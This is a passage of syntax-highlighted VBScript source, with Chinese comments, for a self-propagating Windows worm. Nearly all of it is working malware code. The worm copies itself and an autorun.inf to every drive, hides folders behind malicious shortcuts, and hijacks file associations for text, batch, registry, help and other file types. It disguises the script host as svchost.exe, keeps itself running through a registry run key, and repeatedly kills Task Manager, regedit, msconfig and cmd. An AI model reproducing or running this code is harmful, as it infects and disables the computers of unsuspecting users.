class="attr">SystemRoot</span>%/<span class="attr">system</span>/<span class="attr">svchost.exe</span> "&<span class="attr">VirusLoad</span>)</span></span><br><span class="line"><span class="tag">       </span></span><br><span class="line"><span class="tag">    <span class="attr">Case</span> "<span class="attr">emc</span>" '//劫持<span class="attr">Win</span>+<span class="attr">E</span></span></span><br><span class="line"><span class="tag">        <span class="attr">RunPath</span>=<span class="string">"explorer.exe /n,/e,::{20D04FE0-3AEA-1069-A2D8-08002B30309D}"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">Call</span> <span class="attr">Run</span>(<span class="attr">RunPath</span>)</span></span><br><span class="line"><span class="tag">        <span class="attr">Call</span> <span class="attr">InvadeSystem</span>(<span class="attr">VirusLoad</span>,<span class="attr">VirusAss</span>)</span></span><br><span class="line"><span class="tag">        <span class="attr">Call</span> <span class="attr">Run</span>("%<span class="attr">SystemRoot</span>%/<span class="attr">system</span>/<span class="attr">svchost.exe</span> "&<span class="attr">VirusLoad</span>)</span></span><br><span class="line"><span class="tag"></span></span><br><span class="line"><span class="tag">    <span class="attr">Case</span> <span class="attr">Else</span></span></span><br><span class="line"><span class="tag">        <span class="attr">If</span> <span class="attr">PreDblInstance</span>=<span class="string">True</span> <span class="attr">Then</span> '//如果条件满足，退出脚本宿主</span></span><br><span class="line"><span class="tag">            <span class="attr">WScript.Quit</span></span></span><br><span class="line"><span class="tag">        <span class="attr">End</span> <span class="attr">If</span></span></span><br><span class="line"><span class="tag">        <span class="attr">Timeout</span> = <span class="string">Datediff(</span>"<span class="attr">ww</span>", <span class="attr">GetInfectedDate</span>, <span class="attr">Date</span>) <span class="attr">-</span> <span class="attr">12</span></span></span><br><span class="line"><span class="tag">        <span class="attr">If</span> <span class="attr">Timeout</span>></span>0 And Month(Date) = Day(Date) Then</span><br><span class="line">               Call VirusAlert()</span><br><span class="line">               Call MakeJoke(CInt(Month(Date)))</span><br><span class="line">        End If</span><br><span class="line">        Call MonitorSystem()</span><br><span class="line">       </span><br><span class="line">    End Select</span><br><span class="line">End Sub</span><br><span class="line"></span><br><span class="line">'//监视系统 结束taskmgr.exe、regedit.exe、msconfig.exe、cmd.exe</span><br><span class="line">Sub MonitorSystem()</span><br><span class="line">    On Error Resume Next</span><br><span class="line">    Dim ProcessNames, ExeFullNames</span><br><span class="line">    ProcessNames=Array("cmd.exe","cmd.com","regedit.exe","regedit.scr","regedit.pif","regedit.com","msconfig.exe")</span><br><span class="line">    VBSFullNames=Array(GetMainVirus(1)) '//变量赋值</span><br><span class="line">    Do</span><br><span class="line">        Call KillProcess(ProcessNames) '//如发现变量中的进程，调用结束进程函数</span><br><span class="line">        Call InvadeSystem(GetMainVirus(1),GetMainVirus(0)) '// smss.exe 蠕虫地址 explorer.exe 蠕虫地址</span><br><span class="line">        Call KeepProcess(VBSFullNames) '//保持病毒进程</span><br><span class="line">        WScript.Sleep 3000 '//脚本宿主等待时间为3000毫秒=3秒</span><br><span class="line">    Loop</span><br><span class="line">End Sub</span><br><span class="line"></span><br><span class="line">'//侵入系统</span><br><span class="line">Sub InvadeSystem(VirusLoadPath,VirusAssPath)</span><br><span class="line">    On Error Resume Next</span><br><span class="line">    Dim Load_Value, File_Value, IE_Value, MyCpt_Value1, MyCpt_Value2, HCULoad, HCUVer, VirusCode, Version</span><br><span class="line">    Load_Value=""""&VirusLoadPath&"""" '//smss.exe的病毒流</span><br><span class="line">    File_Value="%SystemRoot%/System32/WScript.exe "&""""&VirusAssPath&""""&" %1 %* " '// explorer.exe 蠕虫</span><br><span class="line">    IE_Value="%SystemRoot%/System32/WScript.exe "&""""&VirusAssPath&""""&" OIE " '// 打开ie 蠕虫</span><br><span class="line">    MyCpt_Value1="%SystemRoot%/System32/WScript.exe "&""""&VirusAssPath&""""&" OMC " '//打开我的电脑 蠕虫</span><br><span class="line">    MyCpt_Value2="%SystemRoot%/System32/WScript.exe "&""""&VirusAssPath&""""&" EMC " '//劫持Win+E 蠕虫</span><br><span class="line">    HCULoad="HKEY_CURRENT_USER/SoftWare/Microsoft/Windows NT/CurrentVersion/Windows/Load"</span><br><span class="line">    HCUVer="HKEY_CURRENT_USER/SoftWare/Microsoft/Windows NT/CurrentVersion/Windows/Ver"</span><br><span class="line">    HCUDate="HKEY_CURRENT_USER/SoftWare/Microsoft/Windows NT/CurrentVersion/Windows/Date"</span><br><span class="line">    VirusCode=GetCode(WScript.ScriptFullName)</span><br><span class="line">    Version=1</span><br><span class="line">    HostSourcePath=Fso.GetSpecialFolder(1)&"/Wscript.exe"</span><br><span class="line">    HostFilePath=Fso.GetSpecialFolder(0)&"/system/svchost.exe"</span><br><span class="line">   </span><br><span class="line">    For Each Drive In Fso.Drives '//分别建立各个目录的病毒名字</span><br><span class="line">        If Drive.IsReady and (Drive.DriveType=1 Or Drive.DriveType=2 Or Drive.DriveType=3) Then</span><br><span class="line">            DiskVirusName=GetSerialNumber(Drive.DriveLetter)&".vbs"</span><br><span class="line">                Call CreateAutoRun(Drive.DriveLetter,DiskVirusName) '//创建自动运行</span><br><span class="line">                Call InfectRoot(Drive.DriveLetter,DiskVirusName) '//感染</span><br><span class="line">        End If</span><br><span class="line">    Next</span><br><span class="line">   </span><br><span class="line">    If FSO.FileExists(VirusAssPath)=False Or FSO.FileExists(VirusLoadPath)=False Or FSO.FileExists(HostFilePath)=False Or GetVersion()<span class="tag">< <span class="attr">Version</span> <span class="attr">Then</span></span></span><br><span class="line"><span class="tag">        <span class="attr">If</span> <span class="attr">GetFileSystemType</span>(<span class="attr">GetSystemDrive</span>())=<span class="string">"NTFS"</span> <span class="attr">Then</span> '//判断是否为<span class="attr">NTFS</span>分区</span></span><br><span class="line"><span class="tag">            <span class="attr">Call</span> <span class="attr">CreateFile</span>(<span class="attr">VirusCode</span>,<span class="attr">VirusAssPath</span>)</span></span><br><span class="line"><span class="tag">            <span class="attr">Call</span> <span class="attr">CreateFile</span>(<span class="attr">VirusCode</span>,<span class="attr">VirusLoadPath</span>) '//这一步创建了流文件</span></span><br><span class="line"><span class="tag">            <span class="attr">Call</span> <span class="attr">CopyFile</span>(<span class="attr">HostSourcePath</span>,<span class="attr">HostFilePath</span>) '//这一步将<span class="attr">wscript.exe</span>从<span class="attr">system32</span>复制到<span class="attr">system</span>目录并改名<span class="attr">svchost.exe</span></span></span><br><span class="line"><span class="tag">            <span class="attr">Call</span> <span class="attr">SetHiddenAttr</span>(<span class="attr">HostFilePath</span>)</span></span><br><span class="line"><span class="tag">        <span class="attr">Else</span> '//<span class="attr">FAT32</span>格式</span></span><br><span class="line"><span class="tag">            <span class="attr">Call</span> <span class="attr">CreateFile</span>(<span class="attr">VirusCode</span>, <span class="attr">VirusAssPath</span>)</span></span><br><span class="line"><span class="tag">            <span class="attr">Call</span> <span class="attr">SetHiddenAttr</span>(<span class="attr">VirusAssPath</span>)</span></span><br><span class="line"><span class="tag">            <span class="attr">Call</span> <span class="attr">CreateFile</span>(<span class="attr">VirusCode</span>,<span class="attr">VirusLoadPath</span>)</span></span><br><span class="line"><span class="tag">            <span class="attr">Call</span> <span class="attr">SetHiddenAttr</span>(<span class="attr">VirusLoadPath</span>)</span></span><br><span class="line"><span class="tag">            <span class="attr">Call</span> <span class="attr">CopyFile</span>(<span class="attr">HostSourcePath</span>, <span class="attr">HostFilePath</span>)</span></span><br><span class="line"><span class="tag">            <span class="attr">Call</span> <span class="attr">SetHiddenAttr</span>(<span class="attr">HostFilePath</span>)</span></span><br><span class="line"><span class="tag">        <span class="attr">End</span> <span class="attr">If</span></span></span><br><span class="line"><span class="tag">    <span class="attr">End</span> <span class="attr">If</span></span></span><br><span class="line"><span class="tag">   </span></span><br><span class="line">    If ReadReg(HCULoad)<>Load_Value  Then  '//改写注册表启动项，smss.exe的流</span><br><span class="line">        Call WriteReg (HCULoad, Load_Value, "")</span><br><span class="line">    End If</span><br><span class="line">   </span><br><span class="line">    If GetVersion() <span class="tag">< <span class="attr">Version</span> <span class="attr">Then</span>   '//改写版本信息为<span class="attr">1</span></span></span><br><span class="line"><span class="tag">        <span class="attr">Call</span> <span class="attr">WriteReg</span> (<span class="attr">HCUVer</span>, <span class="attr">Version</span>, "")</span></span><br><span class="line"><span class="tag">    <span class="attr">End</span> <span class="attr">If</span></span></span><br><span class="line"><span class="tag">   </span></span><br><span class="line"><span class="tag">    <span class="attr">If</span> <span class="attr">GetInfectedDate</span>() = <span class="string">""</span> <span class="attr">Then</span></span></span><br><span class="line"><span class="tag">        <span class="attr">Call</span> <span class="attr">WriteReg</span> (<span class="attr">HCUDate</span>, <span class="attr">Date</span>, "")  '//记录感染时间</span></span><br><span class="line"><span class="tag">    <span class="attr">End</span> <span class="attr">If</span></span></span><br><span class="line"><span class="tag"></span></span><br><span class="line"><span class="tag">    '//以下更改许多文件关联,病毒的通用感染方式</span></span><br><span class="line">    If ReadReg("HKEY_LOCAL_MACHINE/SOFTWARE/Classes/txtfile/shell/open/command/")<>File_Value Then</span><br><span class="line">        Call SetTxtFileAss(VirusAssPath)</span><br><span class="line">    End If</span><br><span class="line">   </span><br><span class="line">    If ReadReg("HKEY_LOCAL_MACHINE/SOFTWARE/Classes/inifile/shell/open/command/")<span class="tag"><></span>File_Value Then</span><br><span class="line">        Call SetIniFileAss(VirusAssPath)</span><br><span class="line">    End If</span><br><span class="line">   </span><br><span class="line">    If ReadReg("HKEY_LOCAL_MACHINE/SOFTWARE/Classes/inffile/shell/open/command/")<span class="tag"><></span>File_Value Then</span><br><span class="line">        Call SetInfFileAss(VirusAssPath)</span><br><span class="line">    End If</span><br><span class="line">   </span><br><span class="line">    If ReadReg("HKEY_LOCAL_MACHINE/SOFTWARE/Classes/batfile/shell/open/command/")<span class="tag"><></span>File_Value Then</span><br><span class="line">        Call SetBatFileAss(VirusAssPath)</span><br><span class="line">    End If</span><br><span class="line">   </span><br><span class="line">    If ReadReg("HKEY_LOCAL_MACHINE/SOFTWARE/Classes/cmdfile/shell/open/command/")<span class="tag"><></span>File_Value Then</span><br><span class="line">        Call SetCmdFileAss(VirusAssPath)</span><br><span class="line">    End If</span><br><span class="line"></span><br><span class="line">    If ReadReg("HKEY_LOCAL_MACHINE/SOFTWARE/Classes/regfile/shell/open/command/")<span class="tag"><></span>File_Value Then</span><br><span class="line">        Call SetRegFileAss(VirusAssPath)</span><br><span class="line">    End If</span><br><span class="line">   </span><br><span class="line">    If ReadReg("HKEY_LOCAL_MACHINE/SOFTWARE/Classes/chm.file/shell/open/command/")<span class="tag"><></span>File_Value Then</span><br><span class="line">        Call SetchmFileAss(VirusAssPath)</span><br><span class="line">    End If</span><br><span class="line">   </span><br><span class="line">    If ReadReg("HKEY_LOCAL_MACHINE/SOFTWARE/Classes/hlpfile/shell/open/command/")<span class="tag"><></span>File_Value Then</span><br><span class="line">        Call SethlpFileAss(VirusAssPath)</span><br><span class="line">    End If</span><br><span class="line">   </span><br><span class="line">    If ReadReg("HKEY_LOCAL_MACHINE/SOFTWARE/Classes/Applications/iexplore.exe/shell/open/command/")<span class="tag"><></span>IE_Value Then</span><br><span class="line">        Call SetIEAss(VirusAssPath)</span><br><span class="line">    End If</span><br><span class="line">   </span><br><span class="line">    If ReadReg("HKEY_CLASSES_ROOT/CLSID/{871C5380-42A0-1069-A2EA-08002B30309D}/shell/OpenHomePage/Command/")<span class="tag"><></span>IE_Value Then</span><br><span class="line">        Call SetIEAss(VirusAssPath)</span><br><span class="line">    End If</span><br><span class="line">   </span><br><span class="line">    If ReadReg("HKEY_CLASSES_ROOT/CLSID/{20D04FE0-3AEA-1069-A2D8-08002B30309D}/shell/open/command/")<span class="tag"><></span>MyCpt_Value1 Then</span><br><span class="line">        Call SetMyComputerAss(VirusAssPath)</span><br><span class="line">    End If</span><br><span class="line">   </span><br><span class="line">    If ReadReg("HKEY_CLASSES_ROOT/CLSID/{20D04FE0-3AEA-1069-A2D8-08002B30309D}/shell/explore/command/")<span class="tag"><></span>MyCpt_Value2 Then</span><br><span class="line">        Call SetMyComputerAss(VirusAssPath)</span><br><span class="line">    End If</span><br><span class="line">   </span><br><span class="line">    Call RegSet()</span><br><span class="line">End Sub</span><br><span class="line"></span><br><span class="line">'//拷贝文件</span><br><span class="line">Sub CopyFile(source, pathf)</span><br><span class="line">    On Error Resume Next</span><br><span class="line">    If FSO.FileExists(pathf) Then</span><br><span class="line">        FSO.DeleteFile pathf , True</span><br><span class="line">    End If   </span><br><span class="line">    FSO.CopyFile source, pathf</span><br><span class="line">End Sub</span><br><span class="line"></span><br><span class="line">'//创建文件</span><br><span class="line">Sub CreateFile(code, pathf)</span><br><span class="line">    On Error Resume Next</span><br><span class="line">    Dim FileText</span><br><span class="line">    If FSO.FileExists(pathf) Then</span><br><span class="line">        Set FileText=FSO.OpenTextFile(pathf, 2, False)</span><br><span class="line">        FileText.Write code</span><br><span class="line">        FileText.Close</span><br><span class="line">    Else</span><br><span class="line">        Set FileText=FSO.OpenTextFile(pathf, 2, True)</span><br><span class="line">        FileText.Write code</span><br><span class="line">        FileText.Close</span><br><span class="line">    End If</span><br><span class="line">End Sub</span><br><span class="line"></span><br><span class="line">'//注册表设置</span><br><span class="line">Sub RegSet()</span><br><span class="line">    On Error Resume Next</span><br><span class="line">    Dim RegPath1 , RegPath2, RegPath3, RegPath4</span><br><span class="line">    RegPath1="HKEY_LOCAL_MACHINE/SOFTWARE/Microsoft/Windows/CurrentVersion/Explorer/Advanced/Folder/Hidden/NOHIDDEN/CheckedValue"</span><br><span class="line">    RegPath2="HKEY_LOCAL_MACHINE/SOFTWARE/Microsoft/Windows/CurrentVersion/Explorer/Advanced/Folder/Hidden/SHOWALL/CheckedValue"</span><br><span class="line">    RegPath3="HKEY_CURRENT_USER/Software/Microsoft/Windows/CurrentVersion/Policies/Explorer/NoDriveTypeAutoRun"</span><br><span class="line">    RegPath4="HKEY_CLASSES_ROOT/lnkfile/IsShortcut"</span><br><span class="line">    Call WriteReg (RegPath1, 3, "REG_DWORD")</span><br><span class="line">    Call WriteReg (RegPath2, 2, "REG_DWORD")</span><br><span class="line">    Call WriteReg (RegPath3, 0, "REG_DWORD")</span><br><span class="line">    Call DeleteReg (RegPath4)</span><br><span class="line">End Sub</span><br><span class="line"></span><br><span class="line">'//结束进程</span><br><span class="line">Sub KillProcess(ProcessNames)</span><br><span class="line">    On Error Resume Next</span><br><span class="line">    Set WMIService=GetObject("winmgmts://./root/cimv2")</span><br><span class="line">    For Each ProcessName in ProcessNames</span><br><span class="line">        Set ProcessList=WMIService.execquery(" Select * From win32_process where name ='"&ProcessName&"' ")</span><br><span class="line">        For Each Process in ProcessList</span><br><span class="line">            IntReturn=Process.terminate</span><br><span class="line">            If intReturn<span class="tag"><></span>0 Then</span><br><span class="line">                WshShell.Run "CMD /c ntsd -c q -p "&Process.Handle, vbHide, False</span><br><span class="line">            End If</span><br><span class="line">        Next</span><br><span class="line">    Next</span><br><span class="line">End Sub</span><br><span class="line"></span><br><span class="line">'//删掉autorun.inf免疫目录</span><br><span class="line">Sub KillImmunity(D)</span><br><span class="line">    On Error Resume Next</span><br><span class="line">    ImmunityFolder=D&":/Autorun.inf"</span><br><span class="line">    If Fso.FolderExists(ImmunityFolder) Then</span><br><span class="line">        WshSHell.Run ("CMD /C CACLS "& """"&ImmunityFolder&"""" &" /t /e /c /g everyone:f"),vbHide,True   '//提权</span><br><span class="line">        WshSHell.Run ("CMD /C RD /S /Q "& ImmunityFolder), vbHide, True   '//rd命令删除，配合 /s /q 选项，很轻松</span><br><span class="line">    End If</span><br><span class="line">End Sub</span><br><span class="line"></span><br><span class="line">'//保护病毒进程 保持脚本进程持续运行，少于2个创建新进程</span><br><span class="line">Sub KeepProcess(VBSFullNames)</span><br><span class="line">    On Error Resume Next</span><br><span class="line">    For Each VBSFullName in VBSFullNames</span><br><span class="line">        If VBSProcessCount(VBSFullName) <span class="tag">< <span class="attr">2</span> <span class="attr">then</span></span></span><br><span class="line"><span class="tag">            <span class="attr">Run</span>("%<span class="attr">SystemRoot</span>%/<span class="attr">system</span>/<span class="attr">svchost.exe</span> "&<span class="attr">VBSFullName</span>)</span></span><br><span class="line"><span class="tag">        <span class="attr">End</span> <span class="attr">If</span></span></span><br><span class="line"><span class="tag">    <span class="attr">Next</span></span></span><br><span class="line"><span class="tag"><span class="attr">End</span> <span class="attr">Sub</span></span></span><br><span class="line"><span class="tag"></span></span><br><span class="line"><span class="tag">'//获得系统分区 <span class="attr">c:</span></span></span><br><span class="line"><span class="tag">'//<span class="attr">FileSystemObject.GetSpecialFolder</span> 返回指定特殊文件夹</span></span><br><span class="line"><span class="tag">'//<span class="attr">WindowsFolder</span>   <span class="attr">0</span>   <span class="attr">Windows</span> 文件夹，包含 <span class="attr">Windows</span> 操作系统安装的文件。</span></span><br><span class="line"><span class="tag">'//<span class="attr">SystemFolder</span>    <span class="attr">1</span>   <span class="attr">System</span> 文件夹，包含库、字体和设备驱动程序文件。</span></span><br><span class="line"><span class="tag">'//<span class="attr">TemporaryFolder</span> <span class="attr">2</span>   <span class="attr">Temp</span> 文件夹，用于保存临时文件。可以在 <span class="attr">TMP</span> 环境变量中找到该文件夹的路径。</span></span><br><span class="line"><span class="tag">'//<span class="attr">Left</span> 返回指定数目的从字符串的左边算起的字符。</span></span><br><span class="line"><span class="tag"><span class="attr">Function</span> <span class="attr">GetSystemDrive</span>()</span></span><br><span class="line"><span class="tag">    <span class="attr">GetSystemDrive</span>=<span class="string">Left(Fso.GetSpecialFolder(0),2)</span></span></span><br><span class="line"><span class="tag"><span class="attr">End</span> <span class="attr">Function</span></span></span><br><span class="line"><span class="tag"></span></span><br><span class="line"><span class="tag">'//<span class="attr">FileSystemObject.GetDrive</span>返回与指定的路径中驱动器相对应的 <span class="attr">Drive</span> 对象。<span class="attr">Drive</span> 提供对磁盘驱动器或网络共享的属性的访问。</span></span><br><span class="line"><span class="tag">'//<span class="attr">Drive.FileSystem</span>返回指定的驱动器使用的文件系统的类型。</span></span><br><span class="line"><span class="tag"><span class="attr">Function</span> <span class="attr">GetFileSystemType</span>(<span class="attr">Drive</span>)</span></span><br><span class="line"><span class="tag">    <span class="attr">Set</span> <span class="attr">d</span>=<span class="string">FSO.GetDrive(Drive)</span></span></span><br><span class="line"><span class="tag">    <span class="attr">GetFileSystemType</span>=<span class="string">d.FileSystem</span></span></span><br><span class="line"><span class="tag"><span class="attr">End</span> <span class="attr">Function</span></span></span><br><span class="line"><span class="tag"></span></span><br><span class="line"><span class="tag">'//读取注册表建值 返回所在路径</span></span><br><span class="line"><span class="tag"><span class="attr">Function</span> <span class="attr">ReadReg</span>(<span class="attr">strkey</span>)</span></span><br><span class="line"><span class="tag">    <span class="attr">Dim</span> <span class="attr">tmps</span></span></span><br><span class="line"><span class="tag">    <span class="attr">Set</span> <span class="attr">tmps</span>=<span class="string">CreateObject(</span>"<span class="attr">WScript.Shell</span>")</span></span><br><span class="line"><span class="tag">    <span class="attr">ReadReg</span>=<span class="string">tmps.RegRead(strkey)</span></span></span><br><span class="line"><span class="tag">    <span class="attr">Set</span> <span class="attr">tmps</span>=<span class="string">Nothing</span></span></span><br><span class="line"><span class="tag"><span class="attr">End</span> <span class="attr">Function</span></span></span><br><span class="line"><span class="tag"></span></span><br><span class="line"><span class="tag">'//重写注册表键值</span></span><br><span class="line"><span class="tag"><span class="attr">Sub</span> <span class="attr">WriteReg</span>(<span class="attr">strkey</span>, <span class="attr">Value</span>, <span class="attr">vtype</span>)</span></span><br><span class="line"><span class="tag">    <span class="attr">Dim</span> <span class="attr">tmps</span></span></span><br><span class="line"><span class="tag">    <span class="attr">Set</span> <span class="attr">tmps</span>=<span class="string">CreateObject(</span>"<span class="attr">WScript.Shell</span>")</span></span><br><span class="line"><span class="tag">    <span class="attr">If</span> <span class="attr">vtype</span>=<span class="string">""</span> <span class="attr">Then</span></span></span><br><span class="line"><span class="tag">        <span class="attr">tmps.RegWrite</span> <span class="attr">strkey</span>, <span class="attr">Value</span></span></span><br><span class="line"><span class="tag">    <span class="attr">Else</span></span></span><br><span class="line"><span class="tag">        <span class="attr">tmps.RegWrite</span> <span class="attr">strkey</span>, <span class="attr">Value</span>, <span class="attr">vtype</span></span></span><br><span class="line"><span class="tag">    <span class="attr">End</span> <span class="attr">If</span></span></span><br><span class="line"><span class="tag">    <span class="attr">Set</span> <span class="attr">tmps</span>=<span class="string">Nothing</span></span></span><br><span class="line"><span class="tag"><span class="attr">End</span> <span class="attr">Sub</span></span></span><br><span class="line"><span class="tag"></span></span><br><span class="line"><span class="tag">'//删除注册表键值</span></span><br><span class="line"><span class="tag"><span class="attr">Sub</span> <span class="attr">DeleteReg</span>(<span class="attr">strkey</span>)</span></span><br><span class="line"><span class="tag">    <span class="attr">Dim</span> <span class="attr">tmps</span></span></span><br><span class="line"><span class="tag">    <span class="attr">Set</span> <span class="attr">tmps</span>=<span class="string">CreateObject(</span>"<span class="attr">WScript.Shell</span>")</span></span><br><span class="line"><span class="tag">    <span class="attr">tmps.RegDelete</span> <span class="attr">strkey</span></span></span><br><span class="line"><span class="tag">    <span class="attr">Set</span> <span class="attr">tmps</span>=<span class="string">Nothing</span></span></span><br><span class="line"><span class="tag"><span class="attr">End</span> <span class="attr">Sub</span></span></span><br><span class="line"><span class="tag"></span></span><br><span class="line"><span class="tag">'//设置隐藏属性</span></span><br><span class="line"><span class="tag"><span class="attr">Sub</span> <span class="attr">SetHiddenAttr</span>(<span class="attr">path</span>)</span></span><br><span class="line"><span class="tag">    <span class="attr">On</span> <span class="attr">Error</span> <span class="attr">Resume</span> <span class="attr">Next</span></span></span><br><span class="line"><span class="tag">    <span class="attr">Dim</span> <span class="attr">vf</span></span></span><br><span class="line"><span class="tag">    <span class="attr">Set</span> <span class="attr">vf</span>=<span class="string">FSO.GetFile(path)</span></span></span><br><span class="line"><span class="tag">    <span class="attr">Set</span> <span class="attr">vf</span>=<span class="string">FSO.GetFolder(path)</span></span></span><br><span class="line"><span class="tag">    <span class="attr">vf.Attributes</span>=<span class="string">6</span> '// <span class="attr">6</span>=<span class="string">2+4</span> 分别是隐藏、系统属性</span></span><br><span class="line"><span class="tag"><span class="attr">End</span> <span class="attr">Sub</span></span></span><br><span class="line"><span class="tag"></span></span><br><span class="line"><span class="tag">'//执行<span class="attr">ExeFullName</span>指定的文件</span></span><br><span class="line"><span class="tag"><span class="attr">Sub</span> <span class="attr">Run</span>(<span class="attr">ExeFullName</span>)</span></span><br><span class="line"><span class="tag">    <span class="attr">On</span> <span class="attr">Error</span> <span class="attr">Resume</span> <span class="attr">Next</span></span></span><br><span class="line"><span class="tag">    <span class="attr">Dim</span> <span class="attr">WshShell</span></span></span><br><span class="line"><span class="tag">    <span class="attr">Set</span> <span class="attr">WshShell</span>=<span class="string">WScript.CreateObject(</span>"<span class="attr">WScript.Shell</span>")</span></span><br><span class="line"><span class="tag">    <span class="attr">WshShell.Run</span> <span class="attr">ExeFullName</span></span></span><br><span class="line"><span class="tag">    <span class="attr">Set</span> <span class="attr">WshShell</span>=<span class="string">Nothing</span></span></span><br><span class="line"><span class="tag"><span class="attr">End</span> <span class="attr">Sub</span></span></span><br><span class="line"><span class="tag"></span></span><br><span class="line"><span class="tag">'//感染根目录</span></span><br><span class="line"><span class="tag"><span class="attr">Sub</span> <span class="attr">InfectRoot</span>(<span class="attr">D</span>,<span class="attr">VirusName</span>)</span></span><br><span class="line"><span class="tag">    <span class="attr">On</span> <span class="attr">Error</span> <span class="attr">Resume</span> <span class="attr">Next</span></span></span><br><span class="line"><span class="tag">    <span class="attr">Dim</span> <span class="attr">VBSCode</span></span></span><br><span class="line"><span class="tag">    <span class="attr">VBSCode</span>=<span class="string">GetCode(WScript.ScriptFullName)</span></span></span><br><span class="line"><span class="tag">    <span class="attr">VBSPath</span>=<span class="string">D&</span>"<span class="attr">:</span>/"&<span class="attr">VirusName</span></span></span><br><span class="line"><span class="tag">    <span class="attr">If</span> <span class="attr">FSO.FileExists</span>(<span class="attr">VBSPath</span>)=<span class="string">False</span> <span class="attr">Then</span></span></span><br><span class="line"><span class="tag">        <span class="attr">Call</span> <span class="attr">CreateFile</span>(<span class="attr">VBSCode</span>, <span class="attr">VBSPath</span>)</span></span><br><span class="line"><span class="tag">        <span class="attr">Call</span> <span class="attr">SetHiddenAttr</span>(<span class="attr">VBSPath</span>)</span></span><br><span class="line"><span class="tag">    <span class="attr">End</span> <span class="attr">If</span></span></span><br><span class="line"><span class="tag">    <span class="attr">Set</span> <span class="attr">Folder</span>=<span class="string">Fso.GetFolder(D&</span>"<span class="attr">:</span>/")  '//隐藏根目录下的所有子目录</span></span><br><span class="line"><span class="tag">    <span class="attr">Set</span> <span class="attr">SubFolders</span>=<span class="string">Folder.Subfolders</span></span></span><br><span class="line"><span class="tag">    <span class="attr">For</span> <span class="attr">Each</span> <span class="attr">SubFolder</span> <span class="attr">In</span> <span class="attr">SubFolders</span></span></span><br><span class="line"><span class="tag">        <span class="attr">SetHiddenAttr</span>(<span class="attr">SubFolder.Path</span>)</span></span><br><span class="line"><span class="tag">        <span class="attr">LnkPath</span>=<span class="string">D&</span>"<span class="attr">:</span>/"&<span class="attr">SubFolder.Name</span>&"<span class="attr">.lnk</span>"  '//创建对应的快捷方式</span></span><br><span class="line"><span class="tag">        <span class="attr">TargetPath</span>=<span class="string">D&</span>"<span class="attr">:</span>/"&<span class="attr">VirusName</span></span></span><br><span class="line"><span class="tag">        <span class="attr">Args</span>=<span class="string">""</span>""&<span class="attr">D</span>&"<span class="attr">:</span>/"&<span class="attr">SubFolder.Name</span>& "/<span class="attr">Dir</span>"""</span></span><br><span class="line">        If Fso.FileExists(LnkPath)=False Or GetTargetPath(LnkPath) <> TargetPath Then</span><br><span class="line">            If Fso.FileExists(LnkPath)=True Then</span><br><span class="line">                FSO.DeleteFile LnkPath, True</span><br><span class="line">            End If</span><br><span class="line">            Call CreateShortcut(LnkPath,TargetPath,Args)</span><br><span class="line">        End If</span><br><span class="line">    Next</span><br><span class="line">End Sub</span><br><span class="line"></span><br><span class="line">'//上一步失败了调用这个函数创建快捷方式</span><br><span class="line">Sub CreateShortcut(LnkPath,TargetPath,Args)</span><br><span class="line">    Set Shortcut=WshShell.CreateShortcut(LnkPath)</span><br><span class="line">    with Shortcut</span><br><span class="line">        .TargetPath=TargetPath</span><br><span class="line">        .Arguments=Args</span><br><span class="line">        .WindowStyle=4</span><br><span class="line">        .IconLocation="%SystemRoot%/System32/Shell32.dll, 3"</span><br><span class="line">        .Save</span><br><span class="line">    end with</span><br><span class="line">End Sub</span><br><span class="line"></span><br><span class="line">'//创建autorun.inf文件</span><br><span class="line">Sub CreateAutoRun(D,VirusName)</span><br><span class="line">    On Error Resume Next</span><br><span class="line">    Dim InfPath, VBSPath, VBSCode</span><br><span class="line">    InfPath=D&":/AutoRun.inf"</span><br><span class="line">    VBSPath=D&":/"&VirusName</span><br><span class="line">    VBSCode=GetCode(WScript.ScriptFullName)</span><br><span class="line">    If FSO.FileExists(InfPath)=False Or FSO.FileExists(VBSPath)=False Then</span><br><span class="line">        Call CreateFile(VBSCode, VBSPath)</span><br><span class="line">        Call SetHiddenAttr(VBSPath)</span><br><span class="line">        StrInf="[AutoRun]"&VBCRLF&"Shellexecute=WScript.exe "&VirusName&" ""AutoRun"""&VBCRLF&"shell/open=打开(&O)"&VBCRLF&"shell/open/command=WScript.exe "&VirusName&"</span><br><span class="line"></span><br><span class="line">""AutoRun"""&VBCRLF&"shell/open/Default=1"& VBCRLF&"shell/explore=资源管理器(&X)"&VBCRLF&"shell/explore/command=WScript.exe "&VirusName&" ""AutoRun"""</span><br><span class="line">        Call KillImmunity(D)</span><br><span class="line">        Call CreateFile(StrInf, InfPath)</span><br><span class="line">        Call SetHiddenAttr(InfPath)</span><br><span class="line">    End If</span><br><span class="line">End Sub</span><br><span class="line"></span><br><span class="line">'//改变txt格式文件关联</span><br><span class="line">Sub SetTxtFileAss(sFilePath)</span><br><span class="line">    On Error Resume Next</span><br><span class="line">    Dim Value</span><br><span class="line">    Value="%SystemRoot%/System32/WScript.exe "&""""&sFilePath&""""&" %1 %* "</span><br><span class="line">    Call WriteReg("HKEY_LOCAL_MACHINE/SOFTWARE/Classes/txtfile/shell/open/command/", Value, "REG_EXPAND_SZ")</span><br><span class="line">End Sub</span><br><span class="line"></span><br><span class="line">'//改变ini格式文件关联</span><br><span class="line">Sub SetIniFileAss(sFilePath)</span><br><span class="line">    On Error Resume Next</span><br><span class="line">    Dim Value</span><br><span class="line">    Value="%SystemRoot%/System32/WScript.exe "&""""&sFilePath&""""&" %1 %* "</span><br><span class="line">    Call WriteReg("HKEY_LOCAL_MACHINE/SOFTWARE/Classes/inifile/shell/open/command/", Value, "REG_EXPAND_SZ")</span><br><span class="line">End Sub</span><br><span class="line"></span><br><span class="line">'//改变inf格式文件关联</span><br><span class="line">Sub SetInfFileAss(sFilePath)</span><br><span class="line">    On Error Resume Next</span><br><span class="line">    Dim Value</span><br><span class="line">    Value="%SystemRoot%/System32/WScript.exe "&""""&sFilePath&""""&" %1 %* "</span><br><span class="line">    Call WriteReg("HKEY_LOCAL_MACHINE/SOFTWARE/Classes/inffile/shell/open/command/", Value, "REG_EXPAND_SZ")</span><br><span class="line">End Sub</span><br><span class="line"></span><br><span class="line">'//改变bat格式文件关联</span><br><span class="line">Sub SetBatFileAss(sFilePath)</span><br><span class="line">    On Error Resume Next</span><br><span class="line">    Dim Value</span><br><span class="line">    Value="%SystemRoot%/System32/WScript.exe "&""""&sFilePath&""""&" %1 %* "</span><br><span class="line">    Call WriteReg("HKEY_LOCAL_MACHINE/SOFTWARE/Classes/batfile/shell/open/command/", Value, "REG_EXPAND_SZ")</span><br><span class="line">End Sub</span><br><span class="line"></span><br><span 